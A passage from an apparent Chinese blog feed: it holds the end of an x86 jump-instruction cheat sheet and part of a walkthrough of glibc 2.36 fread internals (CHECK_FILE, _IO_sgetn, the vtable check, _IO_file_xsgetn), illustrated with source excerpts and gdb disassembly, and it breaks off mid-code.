    <content type="html"><![CDATA[<h2 id="无条件跳转"><a href="#无条件跳转" class="headerlink" title="无条件跳转"></a>无条件跳转</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">JMP ;无条件跳转<br></code></pre></td></tr></table></figure><h2 id="根据CX、ECX寄存器的值跳转"><a href="#根据CX、ECX寄存器的值跳转" class="headerlink" title="根据CX、ECX寄存器的值跳转"></a>根据CX、ECX寄存器的值跳转</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">JCXZ ;CX 为 0 则跳转<br>JECXZ;ECX 为 0 则跳转<br></code></pre></td></tr></table></figure><h2 id="根据标志位跳转的指令"><a href="#根据标志位跳转的指令" class="headerlink" title="根据标志位跳转的指令"></a>根据标志位跳转的指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs assembly">JE ;等于则跳转同JZJNE ;不等于则跳转同JNZ<br>JNE ;不等于则跳转<br>JA   ;无符号大于则跳转<br>JNA  ;无符号不大于则跳转<br>JAE  ;无符号大于等于则跳转同JNB<br>JNAE ;无符号不大于等于则跳转同JB<br>JB   ;无符号小于则跳转<br>JNB  ;无符号不小于则跳转<br>JBE  ;无符号小于等于则跳转同JNA<br>JNBE ;无符号不小于等于则跳转同JA<br>JG   ;有符号大于则跳转<br>JNG  ;有符号不大于则跳转<br>JGE  ;有符号大于等于则跳转同JNL<br>JNGE ;有符号不大于等于则跳转同JL<br>JL   ;有符号小于则跳转<br>JNL  ;有符号不小于则跳转<br>JLE  ;有符号小于等于则跳转同JNG<br>JNLE ;有符号不小于等于则跳转同JG<br>JZ   ;为零则跳转<br>JNZ  ;不为零则跳转<br>JS   ;为负则跳转<br>JNS  ;不为负则跳转<br>JC   ;进位则跳转<br>JNC  ;不进位则跳转<br>JO   ;溢出则跳转<br>JNO  ;不溢出则跳转<br>JP;为偶则跳转<br>JNP  ;不为偶则跳转<br>JPE  ;奇偶位置位则跳转同JP<br>JPO  ;奇偶位复位则跳转同JNP<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【IO_FILE】源码详解-part2</title>
    <link href="/2022/12/07/%E3%80%90IO_FILE%E3%80%91%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3-part2/"/>
    <url>/2022/12/07/%E3%80%90IO_FILE%E3%80%91%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3-part2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在上一篇文章中，主要对IO_FILE结构体相关以及fopen函数进行了深入的介绍。本文将继续从glibc2.36源码出发，介绍fread函数相关内容</p></blockquote><h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>首先是一个宏定义，替换为<code>_IO_fread</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//htps://elixir.bootlin.com/glibc/latest/source/stdio-common/getw.c#L21</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fread(p, m, n, s) _IO_fread (p, m, n, s)</span><br><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/iofread.c#L30</span><br><span class="hljs-type">size_t</span><br>_IO_fread (<span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> count, FILE *fp)<br>&#123;<br>  <span class="hljs-type">size_t</span> bytes_requested = size * count;<br>  <span class="hljs-type">size_t</span> bytes_read;<br>  CHECK_FILE (fp, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (bytes_requested == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  _IO_acquire_lock (fp);<br>  bytes_read = _IO_sgetn (fp, (<span class="hljs-type">char</span> *) buf, bytes_requested);<br>  _IO_release_lock (fp);<br>  <span class="hljs-keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;<br>&#125;<br>libc_hidden_def (_IO_fread)<br></code></pre></td></tr></table></figure><h2 id="CHECK-FILE"><a href="#CHECK-FILE" class="headerlink" title="CHECK_FILE"></a>CHECK_FILE</h2><p>首先进入<code>CHECK_FILE</code>对<strong>fp</strong>进行检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/libioP.h#L866</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> IO_DEBUG</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> CHECK_FILE(FILE, RET) do &#123;\</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> ((FILE) == NULL\</span><br><span class="hljs-meta">|| ((FILE)-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC)\</span><br><span class="hljs-meta">      &#123;\</span><br><span class="hljs-meta">__set_errno (EINVAL);\</span><br><span class="hljs-meta">return RET;\</span><br><span class="hljs-meta">      &#125;\</span><br><span class="hljs-meta">  &#125; while (0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> CHECK_FILE(FILE, RET) do &#123; &#125; while (0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>这里放置一下所有用于检测flag的宏定义的值,目前后16位只使用了15个，0x4000还未设定</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/libio.h#L67</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC         0xFBAD0000 <span class="hljs-comment">/* Magic number */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC_MASK    0xFFFF0000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF          0x0001 <span class="hljs-comment">/* Don&#x27;t deallocate buffer on close. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_UNBUFFERED        0x0002</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_READS          0x0004 <span class="hljs-comment">/* Reading not allowed.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES         0x0008 <span class="hljs-comment">/* Writing not allowed.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_EOF_SEEN          0x0010</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_ERR_SEEN          0x0020</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x0040 <span class="hljs-comment">/* Don&#x27;t call close(_fileno) on close.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_LINKED            0x0080 <span class="hljs-comment">/* In the list of all open files.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IN_BACKUP         0x0100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_LINE_BUF          0x0200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="hljs-comment">/* Put and get pointer move in unison.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_APPENDING      0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_FILEBUF        0x2000</span><br>                           <span class="hljs-comment">/* 0x4000  No longer used, reserved for compat.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_LOCK         0x8000</span><br></code></pre></td></tr></table></figure><p>所以这里的函数就是检测<code>(FILE)-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC</code>即，高位是否为<strong>0xFBAD0000</strong>。然后会调用<code> _IO_acquire_lock</code>，这个宏同样是对结构体进行一些处理，基本可以无视</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/sysdeps/generic/stdio-lock.h#L51</span><br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> __EXCEPTIONS</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_acquire_lock(_fp) \</span><br><span class="hljs-meta">  do &#123;      \</span><br><span class="hljs-meta">    FILE *_IO_acquire_lock_file      \</span><br><span class="hljs-meta">__attribute__((cleanup (_IO_acquire_lock_fct)))      \</span><br><span class="hljs-meta">= (_fp);      \</span><br><span class="hljs-meta">    _IO_flockfile (_IO_acquire_lock_file);</span><br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> _IO_acquire_lock(_fp) _IO_acquire_lock_needs_exceptions_enabled</span><br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_release_lock(_fp) ; &#125; while (0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h2 id="IO-sgetn"><a href="#IO-sgetn" class="headerlink" title="_IO_sgetn"></a>_IO_sgetn</h2><p>核心部分是这里的<code>_IO_sgetn</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L408</span><br><span class="hljs-type">size_t</span><br>_IO_sgetn (FILE *fp, <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> n)<br>&#123;<br>  <span class="hljs-comment">/* FIXME handle putback buffer here! */</span><br>  <span class="hljs-keyword">return</span> _IO_XSGETN (fp, data, n);<br>&#125;<br>libc_hidden_def (_IO_sgetn)<br><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/libioP.h#L182</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">size_t</span> <span class="hljs-params">(*_IO_xsgetn_t)</span> <span class="hljs-params">(FILE *FP, <span class="hljs-type">void</span> *DATA, <span class="hljs-type">size_t</span> N)</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_WXSGETN(FP, DATA, N) WJUMP2 (__xsgetn, FP, DATA, N)</span><br></code></pre></td></tr></table></figure><p>在源码中跟踪这个宏到这里就断了，为找实际函数调用，所以我写了一个实例代码用于gdb跟踪。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>   FILE *fp;<br>   <span class="hljs-type">char</span> c[] = <span class="hljs-string">&quot;This is runoob&quot;</span>;<br>   <span class="hljs-type">char</span> buffer[<span class="hljs-number">20</span>];<br>   fp = fopen(<span class="hljs-string">&quot;file.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>);   <span class="hljs-comment">/* 打开文件用于读写 */</span><br>   fwrite(c, <span class="hljs-built_in">strlen</span>(c) + <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, fp);   <span class="hljs-comment">/* 写入数据到文件 */</span><br>   fseek(fp, <span class="hljs-number">0</span>, SEEK_SET);   <span class="hljs-comment">/* 查找文件的开头 */</span><br>   fread(buffer, <span class="hljs-built_in">strlen</span>(c)+<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, fp);   <span class="hljs-comment">/* 读取并显示数据 */</span><br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buffer);<br>   fclose(fp);<br>   <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们看一下汇编的<code>_IO_sgetn</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7ffff7e0d050 &lt;__GI__IO_sgetn&gt;:     endbr64 <br>0x7ffff7e0d054 &lt;__GI__IO_sgetn+4&gt;:   push   rbx<br>0x7ffff7e0d055 &lt;__GI__IO_sgetn+5&gt;:   lea    rcx,[rip+0x1879a4]        # 0x7ffff7f94a00 &lt;_IO_helper_jumps&gt;<br>0x7ffff7e0d05c &lt;__GI__IO_sgetn+12&gt;:  lea    rax,[rip+0x188705]        # 0x7ffff7f95768<br>0x7ffff7e0d063 &lt;__GI__IO_sgetn+19&gt;:  sub    rax,rcx<br>0x7ffff7e0d066 &lt;__GI__IO_sgetn+22&gt;:  sub    rsp,0x20<br>0x7ffff7e0d06a &lt;__GI__IO_sgetn+26&gt;:  mov    rbx,QWORD PTR [rdi+0xd8]<br>0x7ffff7e0d071 &lt;__GI__IO_sgetn+33&gt;:  mov    r8,rbx<br>0x7ffff7e0d074 &lt;__GI__IO_sgetn+36&gt;:  sub    r8,rcx<br>0x7ffff7e0d077 &lt;__GI__IO_sgetn+39&gt;:  cmp    rax,r8<br>0x7ffff7e0d07a &lt;__GI__IO_sgetn+42&gt;:  jbe    0x7ffff7e0d090 &lt;__GI__IO_sgetn+64&gt;<br>0x7ffff7e0d07c &lt;__GI__IO_sgetn+44&gt;:  mov    rax,QWORD PTR [rbx+0x40]<br>0x7ffff7e0d080 &lt;__GI__IO_sgetn+48&gt;:  add    rsp,0x20<br>0x7ffff7e0d084 &lt;__GI__IO_sgetn+52&gt;:  pop    rbx<br>0x7ffff7e0d085 &lt;__GI__IO_sgetn+53&gt;:  jmp    rax<br>0x7ffff7e0d087 &lt;__GI__IO_sgetn+55&gt;:  nop    WORD PTR [rax+rax*1+0x0]<br>0x7ffff7e0d090 &lt;__GI__IO_sgetn+64&gt;:  mov    QWORD PTR [rsp+0x18],rdx<br>0x7ffff7e0d095 &lt;__GI__IO_sgetn+69&gt;:  mov    QWORD PTR [rsp+0x10],rsi<br>0x7ffff7e0d09a &lt;__GI__IO_sgetn+74&gt;:  mov    QWORD PTR [rsp+0x8],rdi<br>0x7ffff7e0d09f &lt;__GI__IO_sgetn+79&gt;:  call   0x7ffff7e08f70 &lt;_IO_vtable_check&gt;<br>0x7ffff7e0d0a4 &lt;__GI__IO_sgetn+84&gt;:  mov    rax,QWORD PTR [rbx+0x40]<br>0x7ffff7e0d0a8 &lt;__GI__IO_sgetn+88&gt;:  mov    rdx,QWORD PTR [rsp+0x18]<br>0x7ffff7e0d0ad &lt;__GI__IO_sgetn+93&gt;:  mov    rsi,QWORD PTR [rsp+0x10]<br>0x7ffff7e0d0b2 &lt;__GI__IO_sgetn+98&gt;:  mov    rdi,QWORD PTR [rsp+0x8]<br>0x7ffff7e0d0b7 &lt;__GI__IO_sgetn+103&gt;: add    rsp,0x20   <br>0x7ffff7e0d0bb &lt;__GI__IO_sgetn+107&gt;: pop    rbx<br>0x7ffff7e0d0bc &lt;__GI__IO_sgetn+108&gt;: jmp    rax<br></code></pre></td></tr></table></figure><p>我们先分析前半部分，即<strong>jbe</strong>之前的部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7ffff7e0d055 &lt;__GI__IO_sgetn+5&gt;:   lea    rcx,[rip+0x1879a4]        # 0x7ffff7f94a00 &lt;_IO_helper_jumps&gt;<br>0x7ffff7e0d05c &lt;__GI__IO_sgetn+12&gt;:  lea    rax,[rip+0x188705]        # 0x7ffff7f95768<br>0x7ffff7e0d063 &lt;__GI__IO_sgetn+19&gt;:  sub    rax,rcx<br>0x7ffff7e0d066 &lt;__GI__IO_sgetn+22&gt;:  sub    rsp,0x20<br>0x7ffff7e0d06a &lt;__GI__IO_sgetn+26&gt;:  mov    rbx,QWORD PTR [rdi+0xd8]<br>0x7ffff7e0d071 &lt;__GI__IO_sgetn+33&gt;:  mov    r8,rbx<br>0x7ffff7e0d074 &lt;__GI__IO_sgetn+36&gt;:  sub    r8,rcx<br>0x7ffff7e0d077 &lt;__GI__IO_sgetn+39&gt;:  cmp    rax,r8<br>0x7ffff7e0d07a &lt;__GI__IO_sgetn+42&gt;:  jbe    0x7ffff7e0d090 &lt;__GI__IO_sgetn+64&gt;<br></code></pre></td></tr></table></figure><p><strong>rdi</strong>指向的就是<code>IO_FILE</code>结构体开头，所以<strong>rdi+0xd8</strong>就是<strong>vtable</strong>指向的值，其实就是判断<strong>rax</strong>是否小于等于<strong>vtable</strong>，然后决定跳转。</p><ul><li>如果此时不跳转，即<strong>vtable &gt; rax</strong>，会跳转到将<strong>rbx+0x40</strong>的地方，而由前半部分，我们知道<strong>rbx</strong>就是<strong>vtable</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7ffff7e0d07c &lt;__GI__IO_sgetn+44&gt;:  mov    rax,QWORD PTR [rbx+0x40]<br>0x7ffff7e0d080 &lt;__GI__IO_sgetn+48&gt;:  add    rsp,0x20<br>0x7ffff7e0d084 &lt;__GI__IO_sgetn+52&gt;:  pop    rbx<br>0x7ffff7e0d085 &lt;__GI__IO_sgetn+53&gt;:  jmp    rax<br></code></pre></td></tr></table></figure><ul><li>如果此时跳转，即<strong>vtable &lt;&#x3D; rax</strong>，同样会跳转到<strong>rbx+0x40</strong>的地方，不过区别是先进行了一次vtable的check</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7ffff7e0d090 &lt;__GI__IO_sgetn+64&gt;:  mov    QWORD PTR [rsp+0x18],rdx<br>0x7ffff7e0d095 &lt;__GI__IO_sgetn+69&gt;:  mov    QWORD PTR [rsp+0x10],rsi<br>0x7ffff7e0d09a &lt;__GI__IO_sgetn+74&gt;:  mov    QWORD PTR [rsp+0x8],rdi<br>0x7ffff7e0d09f &lt;__GI__IO_sgetn+79&gt;:  call   0x7ffff7e08f70 &lt;_IO_vtable_check&gt;<br>0x7ffff7e0d0a4 &lt;__GI__IO_sgetn+84&gt;:  mov    rax,QWORD PTR [rbx+0x40]<br>0x7ffff7e0d0a8 &lt;__GI__IO_sgetn+88&gt;:  mov    rdx,QWORD PTR [rsp+0x18]<br>0x7ffff7e0d0ad &lt;__GI__IO_sgetn+93&gt;:  mov    rsi,QWORD PTR [rsp+0x10]<br>0x7ffff7e0d0b2 &lt;__GI__IO_sgetn+98&gt;:  mov    rdi,QWORD PTR [rsp+0x8]<br>0x7ffff7e0d0b7 &lt;__GI__IO_sgetn+103&gt;: add    rsp,0x20<br>0x7ffff7e0d0bb &lt;__GI__IO_sgetn+107&gt;: pop    rbx<br>0x7ffff7e0d0bc &lt;__GI__IO_sgetn+108&gt;: jmp    rax<br></code></pre></td></tr></table></figure><h3 id="IO-file-xsgetn"><a href="#IO-file-xsgetn" class="headerlink" title="_IO_file_xsgetn"></a>_IO_file_xsgetn</h3><p><img src="/img/article/fread/image-20221207172245186.png" alt="image-20221207172245186"></p><p>根据gdb动调的结果，<strong>rbx+0x40</strong>即<strong>vtable</strong>偏移为0x40处的函数是<code>_IO_file_xsgetn</code>，在源码中可以查到其定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L1271</span><br><span class="hljs-type">size_t</span><br>_IO_file_xsgetn (FILE *fp, <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> n)<br>&#123;<br>  <span class="hljs-type">size_t</span> want, have;<br>  <span class="hljs-type">ssize_t</span> count;<br>  <span class="hljs-type">char</span> *s = data;<br><br>  want = n;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Maybe we already have a push back pointer.  */</span><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);<br>  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;<br>&#125;<br>      _IO_doallocbuf (fp);<br>    &#125;<br><br>  <span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br>      <span class="hljs-keyword">if</span> (want &lt;= have)<br>&#123;<br>  <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);<br>  fp-&gt;_IO_read_ptr += want;<br>  want = <span class="hljs-number">0</span>;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);<br>      want -= have;<br>      fp-&gt;_IO_read_ptr += have;<br>    &#125;<br><br>  <span class="hljs-comment">/* Check for backup and repeat */</span><br>  <span class="hljs-keyword">if</span> (_IO_in_backup (fp))<br>    &#123;<br>      _IO_switch_to_main_get_area (fp);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>  <span class="hljs-comment">/* If we now want less than a buffer, underflow and repeat</span><br><span class="hljs-comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span><br><span class="hljs-comment">     the user buffer. */</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>      &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br><span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>  <span class="hljs-comment">/* These must be set before the sysread as we might longjmp out</span><br><span class="hljs-comment">     waiting for input. */</span><br>  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br>  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br><br>  <span class="hljs-comment">/* Try to maintain alignment: read a whole number of blocks.  */</span><br>  count = want;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base)<br>    &#123;<br>      <span class="hljs-type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;<br>      <span class="hljs-keyword">if</span> (block_size &gt;= <span class="hljs-number">128</span>)<br>count -= want % block_size;<br>    &#125;<br><br>  count = _IO_SYSREAD (fp, s, count);<br>  <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>fp-&gt;_flags |= _IO_EOF_SEEN;<br>      <span class="hljs-keyword">else</span><br>fp-&gt;_flags |= _IO_ERR_SEEN;<br><br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>  s += count;<br>  want -= count;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)<br>    _IO_pos_adjust (fp-&gt;_offset, count);<br>&#125;<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> n - want;<br>&#125;<br>libc_hidden_def 